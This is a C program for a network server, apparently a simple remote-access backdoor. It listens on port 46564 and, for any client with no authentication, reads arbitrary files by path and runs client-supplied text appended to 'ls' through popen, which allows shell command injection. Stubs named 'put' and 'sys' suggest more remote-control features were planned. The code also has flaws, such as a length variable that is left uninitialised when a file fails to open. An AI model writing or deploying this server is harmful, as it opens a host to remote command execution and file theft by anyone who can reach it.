#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 46564
#define MESSAGE_BUFFER_SIZE 1024

// wait for request/command and then read it
char* recieveFromClient(int socket_fd){

    // read response size
    char message_size_str[MESSAGE_BUFFER_SIZE];
    bzero(message_size_str, MESSAGE_BUFFER_SIZE);
    int code = read(socket_fd, message_size_str, MESSAGE_BUFFER_SIZE);
    if (code < 0)
        printf("Error reading from socket\n");

    // create string to contain message
    int size = atoi(message_size_str);
    char* message = calloc(size + 1, sizeof(char));

    // read actual response
    code = read(socket_fd, message, size);
    if (code < 0)
        printf("Error reading from socket\n");

    return message;
}

// send message to client
void sendStringToClient(int socket_fd, char* message){
    // message length
    int length = strlen(message) + 1;
    // send message
    sendToClient(socket_fd, message, length);
}

// send message to client
void sendToClient(int socket_fd, char* message, long length){

    // get string representation of length of message
    char message_size_str[MESSAGE_BUFFER_SIZE];
    sprintf(message_size_str, "%i", length);

    // send size of actual message
    int code = write(socket_fd, message_size_str, MESSAGE_BUFFER_SIZE);
    if(code < 0){
        printf("Error writing to socket\n");
        return;
    }

    // send actual message
    code = write(socket_fd, message, length);
    if(code < 0){
        printf("Error writing to socket\n");
        return;
    }
}

void main(){
    // variables
    struct sockaddr_in addr;
    struct sockaddr client;
    int socket_fd, connection_socket_fd, code;

    // create socket
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(socket_fd == -1){
        printf("Error opening socket\n");
        return;
    }

    // setup socket binding settings
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = 0;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_family = AF_INET;

    // bind socket
    if(bind(socket_fd, (struct sockaddr *) & addr, sizeof(struct sockaddr_in) ) == -1){
        printf("Error binding socket\n");
        return;
    }

    // notify if successful
    printf("Socket bound to port %i\n", PORT);

    // wait for connection
    listen(socket_fd, 5);

    while(1){
        printf("Ready for connection\n");

        // accept any connection
        int clienlen = sizeof(client);
        connection_socket_fd = accept(socket_fd, &client, &clienlen);
        if(connection_socket_fd < 0){
            printf("Error on accept\n");
            continue;
        }
        
        printf("New connection\n");
        
        // base command
        char* command = recieveFromClient(connection_socket_fd);

        // print command and then execute it
        printf("> %s\n", command);

        if(strcmp(command, "list") == 0){ // list args

            // get shell arguments
            char* shell_args = recieveFromClient(connection_socket_fd);
            char shell_base_command[] = "ls";
            char* shell_command = calloc(strlen(shell_base_command) + strlen(shell_args) + 2, sizeof(char));
            strcat(shell_command, shell_base_command);
            strcat(shell_command, shell_args);

            // execute command and store result, status and/or error
            FILE *command_fp;
            int status;

            // execute
            command_fp = popen(shell_command, "r");
            if(command_fp == NULL){
                printf("Unknown error\n");
            }

            // get length of file
            int tmp_size = 128;
            int str_max_size = 2*tmp_size;
            char* tmp = calloc(tmp_size, sizeof(char));
            char* response = calloc(str_max_size, sizeof(char));

            // read file into string
            while(fgets(tmp, tmp_size, command_fp) != NULL){

                // if buffer is full, double size
                if(strlen(response) + tmp_size + 1 >= str_max_size){
                    str_max_size *= 2;
                    char* new = calloc(str_max_size, sizeof(char));
                    strcpy(new, response);
                    free(response);
                    response = new;
                }

                // append next section
                strcat(response, tmp);
            }
            
            // respond
            sendStringToClient(connection_socket_fd, response);

        }else if(strcmp(command, "get") == 0){ // get filepath
        
            // get filepath
            char* filepath = recieveFromClient(connection_socket_fd);

            char* buffer = 0;
            long length;
            FILE* f = fopen (filepath, "r");

            if(f){
                fseek (f, 0, SEEK_END);
                length = ftell (f);
                fseek (f, 0, SEEK_SET);

                buffer = malloc(length);
                if (buffer){
                    fread(buffer, sizeof(char), length, f);
                }
                fclose (f);
            }

            sendToClient(connection_socket_fd, buffer, length);

        }else if(strcmp(command, "put") == 0){
            
        }else if(strcmp(command, "sys") == 0){
            
        }else if(strcmp(command, "delay") == 0){ // delay integer
            // read delay duration
            char* delay_str = recieveFromClient(connection_socket_fd);
            int delay = atoi(delay_str);

            // sleep for specified time
            sleep(delay);

            // respond
            sendStringToClient(connection_socket_fd, delay_str);
        }

        close(connection_socket_fd);
    }
}